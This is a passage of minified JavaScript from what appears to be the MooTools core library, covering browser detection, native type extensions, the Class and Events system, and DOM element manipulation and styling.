}break;case"hash":b=new Hash(c);break;case"array":b=[];for(var d=0,a=c.length;d<a;d++){b[d]=$unlink(c[d]);}break;default:return c;}return b;}var Browser=$merge({Engine:{name:"unknown",version:0},Platform:{name:(window.orientation!=undefined)?"ipod":(navigator.platform.match(/mac|win|linux/i)||["other"])[0].toLowerCase()},Features:{xpath:!!(document.evaluate),air:!!(window.runtime),query:!!(document.querySelector)},Plugins:{},Engines:{presto:function(){return(!window.opera)?false:((arguments.callee.caller)?960:((document.getElementsByClassName)?950:925));
},trident:function(){return(!window.ActiveXObject)?false:((window.XMLHttpRequest)?((document.querySelectorAll)?6:5):4);},webkit:function(){return(navigator.taintEnabled)?false:((Browser.Features.xpath)?((Browser.Features.query)?525:420):419);
},gecko:function(){return(!document.getBoxObjectFor&&window.mozInnerScreenX==null)?false:((document.getElementsByClassName)?19:18);}}},Browser||{});Browser.Platform[Browser.Platform.name]=true;
Browser.detect=function(){for(var b in this.Engines){var a=this.Engines[b]();if(a){this.Engine={name:b,version:a};this.Engine[b]=this.Engine[b+a]=true;
break;}}return{name:b,version:a};};Browser.detect();Browser.Request=function(){return $try(function(){return new XMLHttpRequest();},function(){return new ActiveXObject("MSXML2.XMLHTTP");
},function(){return new ActiveXObject("Microsoft.XMLHTTP");});};Browser.Features.xhr=!!(Browser.Request());Browser.Plugins.Flash=(function(){var a=($try(function(){return navigator.plugins["Shockwave Flash"].description;
},function(){return new ActiveXObject("ShockwaveFlash.ShockwaveFlash").GetVariable("$version");})||"0 r0").match(/\d+/g);return{version:parseInt(a[0]||0+"."+a[1],10)||0,build:parseInt(a[2],10)||0};
})();function $exec(b){if(!b){return b;}if(window.execScript){window.execScript(b);}else{var a=document.createElement("script");a.setAttribute("type","text/javascript");
a[(Browser.Engine.webkit&&Browser.Engine.version<420)?"innerText":"text"]=b;document.head.appendChild(a);document.head.removeChild(a);}return b;}Native.UID=1;
var $uid=(Browser.Engine.trident)?function(a){return(a.uid||(a.uid=[Native.UID++]))[0];}:function(a){return a.uid||(a.uid=Native.UID++);};var Window=new Native({name:"Window",legacy:(Browser.Engine.trident)?null:window.Window,initialize:function(a){$uid(a);
if(!a.Element){a.Element=$empty;if(Browser.Engine.webkit){a.document.createElement("iframe");}a.Element.prototype=(Browser.Engine.webkit)?window["[[DOMElement.prototype]]"]:{};
}a.document.window=a;return $extend(a,Window.Prototype);},afterImplement:function(b,a){window[b]=Window.Prototype[b]=a;}});Window.Prototype={$family:{name:"window"}};
new Window(window);var Document=new Native({name:"Document",legacy:(Browser.Engine.trident)?null:window.Document,initialize:function(a){$uid(a);a.head=a.getElementsByTagName("head")[0];
a.html=a.getElementsByTagName("html")[0];if(Browser.Engine.trident&&Browser.Engine.version<=4){$try(function(){a.execCommand("BackgroundImageCache",false,true);
});}if(Browser.Engine.trident){a.window.attachEvent("onunload",function(){a.window.detachEvent("onunload",arguments.callee);a.head=a.html=a.window=null;
});}return $extend(a,Document.Prototype);},afterImplement:function(b,a){document[b]=Document.Prototype[b]=a;}});Document.Prototype={$family:{name:"document"}};
new Document(document);Array.implement({every:function(c,d){for(var b=0,a=this.length;b<a;b++){if(!c.call(d,this[b],b,this)){return false;}}return true;
},filter:function(d,e){var c=[];for(var b=0,a=this.length;b<a;b++){if(d.call(e,this[b],b,this)){c.push(this[b]);}}return c;},clean:function(){return this.filter($defined);
},indexOf:function(c,d){var a=this.length;for(var b=(d<0)?Math.max(0,a+d):d||0;b<a;b++){if(this[b]===c){return b;}}return -1;},map:function(d,e){var c=[];
for(var b=0,a=this.length;b<a;b++){c[b]=d.call(e,this[b],b,this);}return c;},some:function(c,d){for(var b=0,a=this.length;b<a;b++){if(c.call(d,this[b],b,this)){return true;
}}return false;},associate:function(c){var d={},b=Math.min(this.length,c.length);for(var a=0;a<b;a++){d[c[a]]=this[a];}return d;},link:function(c){var a={};
for(var e=0,b=this.length;e<b;e++){for(var d in c){if(c[d](this[e])){a[d]=this[e];delete c[d];break;}}}return a;},contains:function(a,b){return this.indexOf(a,b)!=-1;
},extend:function(c){for(var b=0,a=c.length;b<a;b++){this.push(c[b]);}return this;},getLast:function(){return(this.length)?this[this.length-1]:null;},getRandom:function(){return(this.length)?this[$random(0,this.length-1)]:null;
},include:function(a){if(!this.contains(a)){this.push(a);}return this;},combine:function(c){for(var b=0,a=c.length;b<a;b++){this.include(c[b]);}return this;
},erase:function(b){for(var a=this.length;a--;a){if(this[a]===b){this.splice(a,1);}}return this;},empty:function(){this.length=0;return this;},flatten:function(){var d=[];
for(var b=0,a=this.length;b<a;b++){var c=$type(this[b]);if(!c){continue;}d=d.concat((c=="array"||c=="collection"||c=="arguments")?Array.flatten(this[b]):this[b]);
}return d;},hexToRgb:function(b){if(this.length!=3){return null;}var a=this.map(function(c){if(c.length==1){c+=c;}return c.toInt(16);});return(b)?a:"rgb("+a+")";
},rgbToHex:function(d){if(this.length<3){return null;}if(this.length==4&&this[3]==0&&!d){return"transparent";}var b=[];for(var a=0;a<3;a++){var c=(this[a]-0).toString(16);
b.push((c.length==1)?"0"+c:c);}return(d)?b:"#"+b.join("");}});Function.implement({extend:function(a){for(var b in a){this[b]=a[b];}return this;},create:function(b){var a=this;
b=b||{};return function(d){var c=b.arguments;c=(c!=undefined)?$splat(c):Array.slice(arguments,(b.event)?1:0);if(b.event){c=[d||window.event].extend(c);
}var e=function(){return a.apply(b.bind||null,c);};if(b.delay){return setTimeout(e,b.delay);}if(b.periodical){return setInterval(e,b.periodical);}if(b.attempt){return $try(e);
}return e();};},run:function(a,b){return this.apply(b,$splat(a));},pass:function(a,b){return this.create({bind:b,arguments:a});},bind:function(b,a){return this.create({bind:b,arguments:a});
},bindWithEvent:function(b,a){return this.create({bind:b,arguments:a,event:true});},attempt:function(a,b){return this.create({bind:b,arguments:a,attempt:true})();
},delay:function(b,c,a){return this.create({bind:c,arguments:a,delay:b})();},periodical:function(c,b,a){return this.create({bind:b,arguments:a,periodical:c})();
}});Number.implement({limit:function(b,a){return Math.min(a,Math.max(b,this));},round:function(a){a=Math.pow(10,a||0);return Math.round(this*a)/a;},times:function(b,c){for(var a=0;
a<this;a++){b.call(c,a,this);}},toFloat:function(){return parseFloat(this);},toInt:function(a){return parseInt(this,a||10);}});Number.alias("times","each");
(function(b){var a={};b.each(function(c){if(!Number[c]){a[c]=function(){return Math[c].apply(null,[this].concat($A(arguments)));};}});Number.implement(a);
})(["abs","acos","asin","atan","atan2","ceil","cos","exp","floor","log","max","min","pow","sin","sqrt","tan"]);String.implement({test:function(a,b){return((typeof a=="string")?new RegExp(a,b):a).test(this);
},contains:function(a,b){return(b)?(b+this+b).indexOf(b+a+b)>-1:this.indexOf(a)>-1;},trim:function(){return this.replace(/^\s+|\s+$/g,"");},clean:function(){return this.replace(/\s+/g," ").trim();
},camelCase:function(){return this.replace(/-\D/g,function(a){return a.charAt(1).toUpperCase();});},hyphenate:function(){return this.replace(/[A-Z]/g,function(a){return("-"+a.charAt(0).toLowerCase());
});},capitalize:function(){return this.replace(/\b[a-z]/g,function(a){return a.toUpperCase();});},escapeRegExp:function(){return this.replace(/([-.*+?^${}()|[\]\/\\])/g,"\\$1");
},toInt:function(a){return parseInt(this,a||10);},toFloat:function(){return parseFloat(this);},hexToRgb:function(b){var a=this.match(/^#?(\w{1,2})(\w{1,2})(\w{1,2})$/);
return(a)?a.slice(1).hexToRgb(b):null;},rgbToHex:function(b){var a=this.match(/\d{1,3}/g);return(a)?a.rgbToHex(b):null;},stripScripts:function(b){var a="";
var c=this.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi,function(){a+=arguments[1]+"\n";return"";});if(b===true){$exec(a);}else{if($type(b)=="function"){b(a,c);
}}return c;},substitute:function(a,b){return this.replace(b||(/\\?\{([^{}]+)\}/g),function(d,c){if(d.charAt(0)=="\\"){return d.slice(1);}return(a[c]!=undefined)?a[c]:"";
});}});Hash.implement({has:Object.prototype.hasOwnProperty,keyOf:function(b){for(var a in this){if(this.hasOwnProperty(a)&&this[a]===b){return a;}}return null;
},hasValue:function(a){return(Hash.keyOf(this,a)!==null);},extend:function(a){Hash.each(a||{},function(c,b){Hash.set(this,b,c);},this);return this;},combine:function(a){Hash.each(a||{},function(c,b){Hash.include(this,b,c);
},this);return this;},erase:function(a){if(this.hasOwnProperty(a)){delete this[a];}return this;},get:function(a){return(this.hasOwnProperty(a))?this[a]:null;
},set:function(a,b){if(!this[a]||this.hasOwnProperty(a)){this[a]=b;}return this;},empty:function(){Hash.each(this,function(b,a){delete this[a];},this);
return this;},include:function(a,b){if(this[a]==undefined){this[a]=b;}return this;},map:function(b,c){var a=new Hash;Hash.each(this,function(e,d){a.set(d,b.call(c,e,d,this));
},this);return a;},filter:function(b,c){var a=new Hash;Hash.each(this,function(e,d){if(b.call(c,e,d,this)){a.set(d,e);}},this);return a;},every:function(b,c){for(var a in this){if(this.hasOwnProperty(a)&&!b.call(c,this[a],a)){return false;
}}return true;},some:function(b,c){for(var a in this){if(this.hasOwnProperty(a)&&b.call(c,this[a],a)){return true;}}return false;},getKeys:function(){var a=[];
Hash.each(this,function(c,b){a.push(b);});return a;},getValues:function(){var a=[];Hash.each(this,function(b){a.push(b);});return a;},toQueryString:function(a){var b=[];
Hash.each(this,function(f,e){if(a){e=a+"["+e+"]";}var d;switch($type(f)){case"object":d=Hash.toQueryString(f,e);break;case"array":var c={};f.each(function(h,g){c[g]=h;
});d=Hash.toQueryString(c,e);break;default:d=e+"="+encodeURIComponent(f);}if(f!=undefined){b.push(d);}});return b.join("&");}});Hash.alias({keyOf:"indexOf",hasValue:"contains"});
var Event=new Native({name:"Event",initialize:function(a,f){f=f||window;var k=f.document;a=a||f.event;if(a.$extended){return a;}this.$extended=true;var j=a.type;
var g=a.target||a.srcElement;while(g&&g.nodeType==3){g=g.parentNode;}if(j.test(/key/)){var b=a.which||a.keyCode;var m=Event.Keys.keyOf(b);if(j=="keydown"){var d=b-111;
if(d>0&&d<13){m="f"+d;}}m=m||String.fromCharCode(b).toLowerCase();}else{if(j.match(/(click|mouse|menu)/i)){k=(!k.compatMode||k.compatMode=="CSS1Compat")?k.html:k.body;
var i={x:a.pageX||a.clientX+k.scrollLeft,y:a.pageY||a.clientY+k.scrollTop};var c={x:(a.pageX)?a.pageX-f.pageXOffset:a.clientX,y:(a.pageY)?a.pageY-f.pageYOffset:a.clientY};
if(j.match(/DOMMouseScroll|mousewheel/)){var h=(a.wheelDelta)?a.wheelDelta/120:-(a.detail||0)/3;}var e=(a.which==3)||(a.button==2);var l=null;if(j.match(/over|out/)){switch(j){case"mouseover":l=a.relatedTarget||a.fromElement;
break;case"mouseout":l=a.relatedTarget||a.toElement;}if(!(function(){while(l&&l.nodeType==3){l=l.parentNode;}return true;}).create({attempt:Browser.Engine.gecko})()){l=false;
}}}}return $extend(this,{event:a,type:j,page:i,client:c,rightClick:e,wheel:h,relatedTarget:l,target:g,code:b,key:m,shift:a.shiftKey,control:a.ctrlKey,alt:a.altKey,meta:a.metaKey});
}});Event.Keys=new Hash({enter:13,up:38,down:40,left:37,right:39,esc:27,space:32,backspace:8,tab:9,"delete":46});Event.implement({stop:function(){return this.stopPropagation().preventDefault();
},stopPropagation:function(){if(this.event.stopPropagation){this.event.stopPropagation();}else{this.event.cancelBubble=true;}return this;},preventDefault:function(){if(this.event.preventDefault){this.event.preventDefault();
}else{this.event.returnValue=false;}return this;}});function Class(b){if(b instanceof Function){b={initialize:b};}var a=function(){Object.reset(this);if(a._prototyping){return this;
}this._current=$empty;var c=(this.initialize)?this.initialize.apply(this,arguments):this;delete this._current;delete this.caller;return c;}.extend(this);
a.implement(b);a.constructor=Class;a.prototype.constructor=a;return a;}Function.prototype.protect=function(){this._protected=true;return this;};Object.reset=function(a,c){if(c==null){for(var e in a){Object.reset(a,e);
}return a;}delete a[c];switch($type(a[c])){case"object":var d=function(){};d.prototype=a[c];var b=new d;a[c]=Object.reset(b);break;case"array":a[c]=$unlink(a[c]);
break;}return a;};new Native({name:"Class",initialize:Class}).extend({instantiate:function(b){b._prototyping=true;var a=new b;delete b._prototyping;return a;
},wrap:function(a,b,c){if(c._origin){c=c._origin;}return function(){if(c._protected&&this._current==null){throw new Error('The method "'+b+'" cannot be called.');
}var e=this.caller,f=this._current;this.caller=f;this._current=arguments.callee;var d=c.apply(this,arguments);this._current=f;this.caller=e;return d;}.extend({_owner:a,_origin:c,_name:b});
}});Class.implement({implement:function(a,d){if($type(a)=="object"){for(var e in a){this.implement(e,a[e]);}return this;}var f=Class.Mutators[a];if(f){d=f.call(this,d);
if(d==null){return this;}}var c=this.prototype;switch($type(d)){case"function":if(d._hidden){return this;}c[a]=Class.wrap(this,a,d);break;case"object":var b=c[a];
if($type(b)=="object"){$mixin(b,d);}else{c[a]=$unlink(d);}break;case"array":c[a]=$unlink(d);break;default:c[a]=d;}return this;}});Class.Mutators={Extends:function(a){this.parent=a;
this.prototype=Class.instantiate(a);this.implement("parent",function(){var b=this.caller._name,c=this.caller._owner.parent.prototype[b];if(!c){throw new Error('The method "'+b+'" has no parent.');
}return c.apply(this,arguments);}.protect());},Implements:function(a){$splat(a).each(function(b){if(b instanceof Function){b=Class.instantiate(b);}this.implement(b);
},this);}};var Chain=new Class({$chain:[],chain:function(){this.$chain.extend(Array.flatten(arguments));return this;},callChain:function(){return(this.$chain.length)?this.$chain.shift().apply(this,arguments):false;
},clearChain:function(){this.$chain.empty();return this;}});var Events=new Class({$events:{},addEvent:function(c,b,a){c=Events.removeOn(c);if(b!=$empty){this.$events[c]=this.$events[c]||[];
this.$events[c].include(b);if(a){b.internal=true;}}return this;},addEvents:function(a){for(var b in a){this.addEvent(b,a[b]);}return this;},fireEvent:function(c,b,a){c=Events.removeOn(c);
if(!this.$events||!this.$events[c]){return this;}this.$events[c].each(function(d){d.create({bind:this,delay:a,"arguments":b})();},this);return this;},removeEvent:function(b,a){b=Events.removeOn(b);
if(!this.$events[b]){return this;}if(!a.internal){this.$events[b].erase(a);}return this;},removeEvents:function(c){var d;if($type(c)=="object"){for(d in c){this.removeEvent(d,c[d]);
}return this;}if(c){c=Events.removeOn(c);}for(d in this.$events){if(c&&c!=d){continue;}var b=this.$events[d];for(var a=b.length;a--;a){this.removeEvent(d,b[a]);
}}return this;}});Events.removeOn=function(a){return a.replace(/^on([A-Z])/,function(b,c){return c.toLowerCase();});};var Options=new Class({setOptions:function(){this.options=$merge.run([this.options].extend(arguments));
if(!this.addEvent){return this;}for(var a in this.options){if($type(this.options[a])!="function"||!(/^on[A-Z]/).test(a)){continue;}this.addEvent(a,this.options[a]);
delete this.options[a];}return this;}});var Element=new Native({name:"Element",legacy:window.Element,initialize:function(a,b){var c=Element.Constructors.get(a);
if(c){return c(b);}if(typeof a=="string"){return document.newElement(a,b);}return document.id(a).set(b);},afterImplement:function(a,b){Element.Prototype[a]=b;
if(Array[a]){return;}Elements.implement(a,function(){var c=[],g=true;for(var e=0,d=this.length;e<d;e++){var f=this[e][a].apply(this[e],arguments);c.push(f);
if(g){g=($type(f)=="element");}}return(g)?new Elements(c):c;});}});Element.Prototype={$family:{name:"element"}};Element.Constructors=new Hash;var IFrame=new Native({name:"IFrame",generics:false,initialize:function(){var f=Array.link(arguments,{properties:Object.type,iframe:$defined});
var d=f.properties||{};var c=document.id(f.iframe);var e=d.onload||$empty;delete d.onload;d.id=d.name=$pick(d.id,d.name,c?(c.id||c.name):"IFrame_"+$time());
c=new Element(c||"iframe",d);var b=function(){var g=$try(function(){return c.contentWindow.location.host;});if(!g||g==window.location.host){var h=new Window(c.contentWindow);
new Document(c.contentWindow.document);$extend(h.Element.prototype,Element.Prototype);}e.call(c.contentWindow,c.contentWindow.document);};var a=$try(function(){return c.contentWindow;
});((a&&a.document.body)||window.frames[d.id])?b():c.addListener("load",b);return c;}});var Elements=new Native({initialize:function(f,b){b=$extend({ddup:true,cash:true},b);
f=f||[];if(b.ddup||b.cash){var g={},e=[];for(var c=0,a=f.length;c<a;c++){var d=document.id(f[c],!b.cash);if(b.ddup){if(g[d.uid]){continue;}g[d.uid]=true;
}if(d){e.push(d);}}f=e;}return(b.cash)?$extend(f,this):f;}});Elements.implement({filter:function(a,b){if(!a){return this;}return new Elements(Array.filter(this,(typeof a=="string")?function(c){return c.match(a);
}:a,b));}});Document.implement({newElement:function(a,b){if(Browser.Engine.trident&&b){["name","type","checked"].each(function(c){if(!b[c]){return;}a+=" "+c+'="'+b[c]+'"';
if(c!="checked"){delete b[c];}});a="<"+a+">";}return document.id(this.createElement(a)).set(b);},newTextNode:function(a){return this.createTextNode(a);
},getDocument:function(){return this;},getWindow:function(){return this.window;},id:(function(){var a={string:function(d,c,b){d=b.getElementById(d);return(d)?a.element(d,c):null;
},element:function(b,e){$uid(b);if(!e&&!b.$family&&!(/^object|embed$/i).test(b.tagName)){var c=Element.Prototype;for(var d in c){b[d]=c[d];}}return b;},object:function(c,d,b){if(c.toElement){return a.element(c.toElement(b),d);
}return null;}};a.textnode=a.whitespace=a.window=a.document=$arguments(0);return function(c,e,d){if(c&&c.$family&&c.uid){return c;}var b=$type(c);return(a[b])?a[b](c,e,d||document):null;
};})()});if(window.$==null){Window.implement({$:function(a,b){return document.id(a,b,this.document);}});}Window.implement({$$:function(a){if(arguments.length==1&&typeof a=="string"){return this.document.getElements(a);
}var f=[];var c=Array.flatten(arguments);for(var d=0,b=c.length;d<b;d++){var e=c[d];switch($type(e)){case"element":f.push(e);break;case"string":f.extend(this.document.getElements(e,true));
}}return new Elements(f);},getDocument:function(){return this.document;},getWindow:function(){return this;}});Native.implement([Element,Document],{getElement:function(a,b){return document.id(this.getElements(a,true)[0]||null,b);
},getElements:function(a,d){a=a.split(",");var c=[];var b=(a.length>1);a.each(function(e){var f=this.getElementsByTagName(e.trim());(b)?c.extend(f):c=f;
},this);return new Elements(c,{ddup:b,cash:!d});}});(function(){var h={},f={};var i={input:"checked",option:"selected",textarea:(Browser.Engine.webkit&&Browser.Engine.version<420)?"innerHTML":"value"};
var c=function(l){return(f[l]||(f[l]={}));};var g=function(n,l){if(!n){return;}var m=n.uid;if(Browser.Engine.trident){if(n.clearAttributes){var q=l&&n.cloneNode(false);
n.clearAttributes();if(q){n.mergeAttributes(q);}}else{if(n.removeEvents){n.removeEvents();}}if((/object/i).test(n.tagName)){for(var o in n){if(typeof n[o]=="function"){n[o]=$empty;
}}Element.dispose(n);}}if(!m){return;}h[m]=f[m]=null;};var d=function(){Hash.each(h,g);if(Browser.Engine.trident){$A(document.getElementsByTagName("object")).each(g);
}if(window.CollectGarbage){CollectGarbage();}h=f=null;};var j=function(n,l,s,m,p,r){var o=n[s||l];var q=[];while(o){if(o.nodeType==1&&(!m||Element.match(o,m))){if(!p){return document.id(o,r);
}q.push(o);}o=o[l];}return(p)?new Elements(q,{ddup:false,cash:!r}):null;};var e={html:"innerHTML","class":"className","for":"htmlFor",defaultValue:"defaultValue",text:(Browser.Engine.trident||(Browser.Engine.webkit&&Browser.Engine.version<420))?"innerText":"textContent"};
var b=["compact","nowrap","ismap","declare","noshade","checked","disabled","readonly","multiple","selected","noresize","defer"];var k=["value","type","defaultValue","accessKey","cellPadding","cellSpacing","colSpan","frameBorder","maxLength","readOnly","rowSpan","tabIndex","useMap"];
b=b.associate(b);Hash.extend(e,b);Hash.extend(e,k.associate(k.map(String.toLowerCase)));var a={before:function(m,l){if(l.parentNode){l.parentNode.insertBefore(m,l);
}},after:function(m,l){if(!l.parentNode){return;}var n=l.nextSibling;(n)?l.parentNode.insertBefore(m,n):l.parentNode.appendChild(m);},bottom:function(m,l){l.appendChild(m);
},top:function(m,l){var n=l.firstChild;(n)?l.insertBefore(m,n):l.appendChild(m);}};a.inside=a.bottom;Hash.each(a,function(l,m){m=m.capitalize();Element.implement("inject"+m,function(n){l(this,document.id(n,true));
return this;});Element.implement("grab"+m,function(n){l(document.id(n,true),this);return this;});});Element.implement({set:function(o,m){switch($type(o)){case"object":for(var n in o){this.set(n,o[n]);
}break;case"string":var l=Element.Properties.get(o);(l&&l.set)?l.set.apply(this,Array.slice(arguments,1)):this.setProperty(o,m);}return this;},get:function(m){var l=Element.Properties.get(m);
return(l&&l.get)?l.get.apply(this,Array.slice(arguments,1)):this.getProperty(m);},erase:function(m){var l=Element.Properties.get(m);(l&&l.erase)?l.erase.apply(this):this.removeProperty(m);
return this;},setProperty:function(m,n){var l=e[m];if(n==undefined){return this.removeProperty(m);}if(l&&b[m]){n=!!n;}(l)?this[l]=n:this.setAttribute(m,""+n);
return this;},setProperties:function(l){for(var m in l){this.setProperty(m,l[m]);}return this;},getProperty:function(m){var l=e[m];var n=(l)?this[l]:this.getAttribute(m,2);
return(b[m])?!!n:(l)?n:n||null;},getProperties:function(){var l=$A(arguments);return l.map(this.getProperty,this).associate(l);},removeProperty:function(m){var l=e[m];
(l)?this[l]=(l&&b[m])?false:"":this.removeAttribute(m);return this;},removeProperties:function(){Array.each(arguments,this.removeProperty,this);return this;
},hasClass:function(l){return this.className.contains(l," ");},addClass:function(l){if(!this.hasClass(l)){this.className=(this.className+" "+l).clean();
}return this;},removeClass:function(l){this.className=this.className.replace(new RegExp("(^|\\s)"+l+"(?:\\s|$)"),"$1");return this;},toggleClass:function(l){return this.hasClass(l)?this.removeClass(l):this.addClass(l);
},adopt:function(){Array.flatten(arguments).each(function(l){l=document.id(l,true);if(l){this.appendChild(l);}},this);return this;},appendText:function(m,l){return this.grab(this.getDocument().newTextNode(m),l);
},grab:function(m,l){a[l||"bottom"](document.id(m,true),this);return this;},inject:function(m,l){a[l||"bottom"](this,document.id(m,true));return this;},replaces:function(l){l=document.id(l,true);
l.parentNode.replaceChild(this,l);return this;},wraps:function(m,l){m=document.id(m,true);return this.replaces(m).grab(m,l);},getPrevious:function(l,m){return j(this,"previousSibling",null,l,false,m);
},getAllPrevious:function(l,m){return j(this,"previousSibling",null,l,true,m);},getNext:function(l,m){return j(this,"nextSibling",null,l,false,m);},getAllNext:function(l,m){return j(this,"nextSibling",null,l,true,m);
},getFirst:function(l,m){return j(this,"nextSibling","firstChild",l,false,m);},getLast:function(l,m){return j(this,"previousSibling","lastChild",l,false,m);
},getParent:function(l,m){return j(this,"parentNode",null,l,false,m);},getParents:function(l,m){return j(this,"parentNode",null,l,true,m);},getSiblings:function(l,m){return this.getParent().getChildren(l,m).erase(this);
},getChildren:function(l,m){return j(this,"nextSibling","firstChild",l,true,m);},getWindow:function(){return this.ownerDocument.window;},getDocument:function(){return this.ownerDocument;
},getElementById:function(o,n){var m=this.ownerDocument.getElementById(o);if(!m){return null;}for(var l=m.parentNode;l!=this;l=l.parentNode){if(!l){return null;
}}return document.id(m,n);},getSelected:function(){return new Elements($A(this.options).filter(function(l){return l.selected;}));},getComputedStyle:function(m){if(this.currentStyle){return this.currentStyle[m.camelCase()];
}var l=this.getDocument().defaultView.getComputedStyle(this,null);return(l)?l.getPropertyValue([m.hyphenate()]):null;},toQueryString:function(){var l=[];
this.getElements("input, select, textarea",true).each(function(m){if(!m.name||m.disabled||m.type=="submit"||m.type=="reset"||m.type=="file"){return;}var n=(m.tagName.toLowerCase()=="select")?Element.getSelected(m).map(function(o){return o.value;
}):((m.type=="radio"||m.type=="checkbox")&&!m.checked)?null:m.value;$splat(n).each(function(o){if(typeof o!="undefined"){l.push(m.name+"="+encodeURIComponent(o));
}});});return l.join("&");},clone:function(o,l){o=o!==false;var r=this.cloneNode(o);var n=function(v,u){if(!l){v.removeAttribute("id");}if(Browser.Engine.trident){v.clearAttributes();
v.mergeAttributes(u);v.removeAttribute("uid");if(v.options){var w=v.options,s=u.options;for(var t=w.length;t--;){w[t].selected=s[t].selected;}}}var x=i[u.tagName.toLowerCase()];
if(x&&u[x]){v[x]=u[x];}};if(o){var p=r.getElementsByTagName("*"),q=this.getElementsByTagName("*");for(var m=p.length;m--;){n(p[m],q[m]);}}n(r,this);return document.id(r);
},destroy:function(){Element.empty(this);Element.dispose(this);g(this,true);return null;},empty:function(){$A(this.childNodes).each(function(l){Element.destroy(l);
});return this;},dispose:function(){return(this.parentNode)?this.parentNode.removeChild(this):this;},hasChild:function(l){l=document.id(l,true);if(!l){return false;
}if(Browser.Engine.webkit&&Browser.Engine.version<420){return $A(this.getElementsByTagName(l.tagName)).contains(l);}return(this.contains)?(this!=l&&this.contains(l)):!!(this.compareDocumentPosition(l)&16);
},match:function(l){return(!l||(l==this)||(Element.get(this,"tag")==l));}});Native.implement([Element,Window,Document],{addListener:function(o,n){if(o=="unload"){var l=n,m=this;
n=function(){m.removeListener("unload",n);l();};}else{h[this.uid]=this;}if(this.addEventListener){this.addEventListener(o,n,false);}else{this.attachEvent("on"+o,n);
}return this;},removeListener:function(m,l){if(this.removeEventListener){this.removeEventListener(m,l,false);}else{this.detachEvent("on"+m,l);}return this;
},retrieve:function(m,l){var o=c(this.uid),n=o[m];if(l!=undefined&&n==undefined){n=o[m]=l;}return $pick(n);},store:function(m,l){var n=c(this.uid);n[m]=l;
return this;},eliminate:function(l){var m=c(this.uid);delete m[l];return this;}});window.addListener("unload",d);})();Element.Properties=new Hash;Element.Properties.style={set:function(a){this.style.cssText=a;
},get:function(){return this.style.cssText;},erase:function(){this.style.cssText="";}};Element.Properties.tag={get:function(){return this.tagName.toLowerCase();
}};Element.Properties.html=(function(){var c=document.createElement("div");var a={table:[1,"<table>","</table>"],select:[1,"<select>","</select>"],tbody:[2,"<table><tbody>","</tbody></table>"],tr:[3,"<table><tbody><tr>","</tr></tbody></table>"]};
a.thead=a.tfoot=a.tbody;var b={set:function(){var e=Array.flatten(arguments).join("");var f=Browser.Engine.trident&&a[this.get("tag")];if(f){var g=c;g.innerHTML=f[1]+e+f[2];
for(var d=f[0];d--;){g=g.firstChild;}this.empty().adopt(g.childNodes);}else{this.innerHTML=e;}}};b.erase=b.set;return b;})();if(Browser.Engine.webkit&&Browser.Engine.version<420){Element.Properties.text={get:function(){if(this.innerText){return this.innerText;
}var a=this.ownerDocument.newElement("div",{html:this.innerHTML}).inject(this.ownerDocument.body);var b=a.innerText;a.destroy();return b;}};}Element.Properties.events={set:function(a){this.addEvents(a);
}};Native.implement([Element,Window,Document],{addEvent:function(e,g){var h=this.retrieve("events",{});h[e]=h[e]||{keys:[],values:[]};if(h[e].keys.contains(g)){return this;
}h[e].keys.push(g);var f=e,a=Element.Events.get(e),c=g,i=this;if(a){if(a.onAdd){a.onAdd.call(this,g);}if(a.condition){c=function(j){if(a.condition.call(this,j)){return g.call(this,j);
}return true;};}f=a.base||f;}var d=function(){return g.call(i);};var b=Element.NativeEvents[f];if(b){if(b==2){d=function(j){j=new Event(j,i.getWindow());
if(c.call(i,j)===false){j.stop();}};}this.addListener(f,d);}h[e].values.push(d);return this;},removeEvent:function(c,b){var a=this.retrieve("events");if(!a||!a[c]){return this;
}var f=a[c].keys.indexOf(b);if(f==-1){return this;}a[c].keys.splice(f,1);var e=a[c].values.splice(f,1)[0];var d=Element.Events.get(c);if(d){if(d.onRemove){d.onRemove.call(this,b);
}c=d.base||c;}return(Element.NativeEvents[c])?this.removeListener(c,e):this;},addEvents:function(a){for(var b in a){this.addEvent(b,a[b]);}return this;
},removeEvents:function(a){var c;if($type(a)=="object"){for(c in a){this.removeEvent(c,a[c]);}return this;}var b=this.retrieve("events");if(!b){return this;
}if(!a){for(c in b){this.removeEvents(c);}this.eliminate("events");}else{if(b[a]){while(b[a].keys[0]){this.removeEvent(a,b[a].keys[0]);}b[a]=null;}}return this;
},fireEvent:function(d,b,a){var c=this.retrieve("events");if(!c||!c[d]){return this;}c[d].keys.each(function(e){e.create({bind:this,delay:a,"arguments":b})();
},this);return this;},cloneEvents:function(d,a){d=document.id(d);var c=d.retrieve("events");if(!c){return this;}if(!a){for(var b in c){this.cloneEvents(d,b);
}}else{if(c[a]){c[a].keys.each(function(e){this.addEvent(a,e);},this);}}return this;}});Element.NativeEvents={click:2,dblclick:2,mouseup:2,mousedown:2,contextmenu:2,mousewheel:2,DOMMouseScroll:2,mouseover:2,mouseout:2,mousemove:2,selectstart:2,selectend:2,keydown:2,keypress:2,keyup:2,focus:2,blur:2,change:2,reset:2,select:2,submit:2,load:1,unload:1,beforeunload:2,resize:1,move:1,DOMContentLoaded:1,readystatechange:1,error:1,abort:1,scroll:1};
(function(){var a=function(b){var c=b.relatedTarget;if(c==undefined){return true;}if(c===false){return false;}return($type(this)!="document"&&c!=this&&c.prefix!="xul"&&!this.hasChild(c));
};Element.Events=new Hash({mouseenter:{base:"mouseover",condition:a},mouseleave:{base:"mouseout",condition:a},mousewheel:{base:(Browser.Engine.gecko)?"DOMMouseScroll":"mousewheel"}});
})();Element.Properties.styles={set:function(a){this.setStyles(a);}};Element.Properties.opacity={set:function(a,b){if(!b){if(a==0){if(this.style.visibility!="hidden"){this.style.visibility="hidden";
}}else{if(this.style.visibility!="visible"){this.style.visibility="visible";}}}if(!this.currentStyle||!this.currentStyle.hasLayout){this.style.zoom=1;}if(Browser.Engine.trident){this.style.filter=(a==1)?"":"alpha(opacity="+a*100+")";
}this.style.opacity=a;this.store("opacity",a);},get:function(){return this.retrieve("opacity",1);}};Element.implement({setOpacity:function(a){return this.set("opacity",a,true);
},getOpacity:function(){return this.get("opacity");},setStyle:function(b,a){switch(b){case"opacity":return this.set("opacity",parseFloat(a));case"float":b=(Browser.Engine.trident)?"styleFloat":"cssFloat";
}b=b.camelCase();if($type(a)!="string"){var c=(Element.Styles.get(b)||"@").split(" ");a=$splat(a).map(function(e,d){if(!c[d]){return"";}return($type(e)=="number")?c[d].replace("@",Math.round(e)):e;
}).join(" ");}else{if(a==String(Number(a))){a=Math.round(a);}}this.style[b]=a;return this;},getStyle:function(g){switch(g){case"opacity":return this.get("opacity");
